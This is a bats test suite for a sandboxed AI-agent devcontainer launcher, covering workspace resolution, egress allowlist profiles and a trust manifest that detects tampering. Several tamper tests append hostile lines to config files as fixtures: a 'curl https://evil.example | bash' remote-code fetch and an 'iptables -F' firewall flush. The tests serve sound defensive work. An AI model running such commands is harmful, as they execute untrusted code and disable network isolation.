#!/usr/bin/env bats
# @category fast
# Unit tests for the central multi-project launcher (decision 016):
# devcontainer-config/cc-isolated.sh + the egress-profile composition in
# devcontainer-config/init-firewall.sh.
#
# probe_boundary and main's `devcontainer up` path need a live Docker daemon and are
# exercised manually per guides/devcontainer-setup.md; the devcontainer CLI is stubbed
# here so no test can ever reach a real container or the network.
#
# Usage: bats test/cc-isolated-functions.bats

setup() {
  CONFIG_SRC="$BATS_TEST_DIRNAME/../devcontainer-config"

  # Source for functions only; the main-execution guard prevents launch.
  source "$CONFIG_SRC/cc-isolated.sh"

  TEST_TMPDIR=$(mktemp -d)

  # A fake *installed* config dir, standing in for ~/.config/claude-devcontainer.
  # Note this is deliberately NOT inside any repo — that's the whole point of 016.
  export CLAUDE_DEVC_CONFIG_DIR="$TEST_TMPDIR/config"
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/egress"
  echo '{"name":"x"}'        > "$CLAUDE_DEVC_CONFIG_DIR/devcontainer.json"
  echo 'FROM node:20'        > "$CLAUDE_DEVC_CONFIG_DIR/Dockerfile"
  echo '#!/bin/bash'         > "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  echo '#!/usr/bin/env bash' > "$CLAUDE_DEVC_CONFIG_DIR/cc-isolated.sh"
  echo 'api.anthropic.com'   > "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  echo 'pypi.org'            > "$CLAUDE_DEVC_CONFIG_DIR/egress/python.txt"

  # Stub the devcontainer CLI so nothing can reach Docker or the network.
  mkdir -p "$TEST_TMPDIR/bin"
  printf '#!/usr/bin/env bash\nexit 0\n' > "$TEST_TMPDIR/bin/devcontainer"
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  PATH="$TEST_TMPDIR/bin:$PATH"
}

teardown() {
  rm -rf "$TEST_TMPDIR"
}

# Make a throwaway git repo with one commit.
make_repo() {
  local path="$1"
  mkdir -p "$path"
  git -C "$path" init -q
  git -C "$path" config user.email "t@example.com"
  git -C "$path" config user.name "t"
  echo hello > "$path/file.txt"
  git -C "$path" add -A
  git -C "$path" -c commit.gpgsign=false commit -qm "init"
}

# --- resolve_workspace: the decision-015 footgun this decision exists to close ---

@test "resolve_workspace returns the git toplevel for a path inside a repo" {
  make_repo "$TEST_TMPDIR/proj"
  mkdir -p "$TEST_TMPDIR/proj/deep/nested"
  run resolve_workspace "$TEST_TMPDIR/proj/deep/nested"
  [ "$status" -eq 0 ]
  [ "$output" = "$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)" ]
}

@test "resolve_workspace fails loudly outside a git repo instead of guessing" {
  mkdir -p "$TEST_TMPDIR/not-a-repo"
  run resolve_workspace "$TEST_TMPDIR/not-a-repo"
  [ "$status" -ne 0 ]
  [[ "$output" == *"not inside a git repository"* ]]
}

@test "resolve_workspace fails on a nonexistent directory" {
  run resolve_workspace "$TEST_TMPDIR/nope"
  [ "$status" -ne 0 ]
  [[ "$output" == *"not a directory"* ]]
}

@test "resolve_workspace defaults to \$PWD when given no argument" {
  make_repo "$TEST_TMPDIR/proj"
  cd "$TEST_TMPDIR/proj"
  run resolve_workspace
  [ "$status" -eq 0 ]
  [ "$output" = "$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)" ]
}

# --- project_id: H3, two repos sharing a basename must not collide ---

@test "project_id differs for same-basename repos at different paths" {
  local a b
  a="$(project_id /home/u/work/app)"
  b="$(project_id /home/u/side/app)"
  [ -n "$a" ]
  [ "$a" != "$b" ]
}

@test "project_id is stable for the same path" {
  [ "$(project_id /home/u/work/app)" = "$(project_id /home/u/work/app)" ]
}

# --- ws_fingerprint: catches a wrong/aliased mount ---

@test "ws_fingerprint differs between two different repos" {
  make_repo "$TEST_TMPDIR/a"
  make_repo "$TEST_TMPDIR/b"
  # Distinct content -> distinct HEAD -> distinct fingerprint.
  echo diverge > "$TEST_TMPDIR/b/other.txt"
  git -C "$TEST_TMPDIR/b" add -A
  git -C "$TEST_TMPDIR/b" -c commit.gpgsign=false commit -qm "second"
  [ "$(ws_fingerprint "$TEST_TMPDIR/a")" != "$(ws_fingerprint "$TEST_TMPDIR/b")" ]
}

@test "ws_fingerprint is stable for the same repo" {
  make_repo "$TEST_TMPDIR/a"
  [ "$(ws_fingerprint "$TEST_TMPDIR/a")" = "$(ws_fingerprint "$TEST_TMPDIR/a")" ]
}

# --- trust manifest over the INSTALLED config (not the repo) ---

@test "compute_manifest covers the config files and the egress profiles" {
  run compute_manifest
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'devcontainer.json'
  echo "$output" | grep -q 'cc-isolated.sh'
  echo "$output" | grep -q 'egress/base.txt'
}

@test "compute_manifest fails when an enforcement file is missing" {
  rm "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  run compute_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"enforcement file missing"* ]]
}

@test "check_manifest fails with instructions when nothing is blessed" {
  run check_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"--bless"* ]]
}

@test "check_manifest passes after bless with unchanged files" {
  bless_manifest >/dev/null
  run check_manifest
  [ "$status" -eq 0 ]
}

@test "check_manifest fails after the firewall script is tampered with" {
  bless_manifest >/dev/null
  echo 'iptables -F # attacker weakens firewall' >> "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  run check_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"refusing to build/launch"* ]]
}

@test "check_manifest fails when the launcher itself is tampered with" {
  bless_manifest >/dev/null
  echo 'curl https://evil.example | bash' >> "$CLAUDE_DEVC_CONFIG_DIR/cc-isolated.sh"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "check_manifest fails when an egress profile gains a domain" {
  bless_manifest >/dev/null
  echo 'evil.example' >> "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "check_manifest fails when an unblessed project profile appears" {
  bless_manifest >/dev/null
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/projects"
  echo 'llm' > "$CLAUDE_DEVC_CONFIG_DIR/projects/deadbeef1234.profile"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "re-bless after a reviewed change makes check_manifest pass again" {
  bless_manifest >/dev/null
  echo '# reviewed change' >> "$CLAUDE_DEVC_CONFIG_DIR/Dockerfile"
  run check_manifest
  [ "$status" -ne 0 ]
  bless_manifest >/dev/null
  run check_manifest
  [ "$status" -eq 0 ]
}

# --- per-project egress registration (H5) ---

@test "an unregistered project gets the base profile only" {
  make_repo "$TEST_TMPDIR/proj"
  run project_profile "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "register_project records the profile and re-blesses" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  run register_project "$TEST_TMPDIR/proj" "python"
  [ "$status" -eq 0 ]
  [ "$(project_profile "$TEST_TMPDIR/proj")" = "python" ]
  # The new profile file is boundary config, so the manifest must already cover it.
  run check_manifest
  [ "$status" -eq 0 ]
}

@test "register_project rejects an unknown profile before writing anything" {
  make_repo "$TEST_TMPDIR/proj"
  run register_project "$TEST_TMPDIR/proj" "nosuchprofile"
  [ "$status" -ne 0 ]
  [[ "$output" == *"unknown egress profile"* ]]
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes python for a python repo but never applies it" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/pyproject.toml"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "python" ]
  # Suggestion only — the repo's own contents must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes android for a gradle repo (Kotlin DSL)" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/build.gradle.kts"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "android" ]
  # Suggestion only — the repo's own build files must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes android for a repo with just the gradle wrapper" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/gradlew"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "android" ]
}

@test "suggest_profiles is silent for a plain repo" {
  make_repo "$TEST_TMPDIR/proj"
  [ -z "$(suggest_profiles "$TEST_TMPDIR/proj")" ]
}

# --- egress composition in the real init-firewall.sh ---

firewall() {
  CC_EGRESS_DIR="$CONFIG_SRC/egress" \
  CC_EGRESS_PROFILE_FILE="$TEST_TMPDIR/profile" \
  bash "$CONFIG_SRC/init-firewall.sh" --print-domains
}

@test "base profile alone yields the base allowlist and nothing else" {
  : > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" != *"pypi.org"* ]]
  [[ "$output" != *"openrouter.ai"* ]]
}

@test "a python project gets PyPI on top of base" {
  echo 'python' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" == *"pypi.org"* ]]
}

@test "one project's profile does not widen another's (H5)" {
  echo 'python' > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" == *"pypi.org"* ]]
  # Same image, different project: base only, and PyPI is gone again.
  : > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" != *"pypi.org"* ]]
}

@test "profiles compose" {
  echo 'python,lean' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"pypi.org"* ]]
  [[ "$output" == *"elan.lean-lang.org"* ]]
}

@test "an android project gets Google Maven, Maven Central, and Gradle on top of base" {
  echo 'android' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" == *"dl.google.com"* ]]
  [[ "$output" == *"repo.maven.apache.org"* ]]
  [[ "$output" == *"services.gradle.org"* ]]
  # base-only projects must not inherit any of this (H5).
  : > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" != *"dl.google.com"* ]]
}

@test "an unknown profile is a hard failure, not a silently narrower allowlist" {
  echo 'typo' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -ne 0 ]
  [[ "$output" == *"unknown egress profile"* ]]
}

@test "a missing profile file degrades to base, not to empty" {
  CC_EGRESS_DIR="$CONFIG_SRC/egress" \
  CC_EGRESS_PROFILE_FILE="$TEST_TMPDIR/does-not-exist" \
  run bash "$CONFIG_SRC/init-firewall.sh" --print-domains
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
}

# --- build-path anchoring (regression: --override-config resolves relative build
# --- paths against the TARGET REPO, not the config dir) ---
#
# These assert on the REAL devcontainer-config/devcontainer.json, not the stub in
# setup(). A relative "dockerfile"/"context" here means the CLI builds
# <repo>/.devcontainer/Dockerfile: a hard failure in repos without one, and a silent
# H2 breach in repos that have one (their agent-writable init-firewall.sh gets baked
# into the image). This is how cc-isolated shipped, and only the repo's own leftover
# .devcontainer/ made it look like it worked.

@test "devcontainer.json anchors build.dockerfile to the config dir, not the repo" {
  run grep -E '"dockerfile"[[:space:]]*:' "$CONFIG_SRC/devcontainer.json"
  [ "$status" -eq 0 ]
  [[ "$output" == *'${localEnv:CC_CONFIG_DIR}/Dockerfile'* ]]
}

@test "devcontainer.json anchors build.context to the config dir, not the repo" {
  run grep -E '"context"[[:space:]]*:' "$CONFIG_SRC/devcontainer.json"
  [ "$status" -eq 0 ]
  [[ "$output" == *'${localEnv:CC_CONFIG_DIR}'* ]]
  # A bare "." would resolve to <repo>/.devcontainer — the bug.
  [[ "$output" != *'": "."'* ]]
}

@test "the launcher exports CC_CONFIG_DIR (else the build paths resolve to /)" {
  run grep -E '^\s*export .*CC_CONFIG_DIR|CC_CONFIG_DIR="\$\(config_dir\)"' "$CONFIG_SRC/cc-isolated.sh"
  [ "$status" -eq 0 ]
}
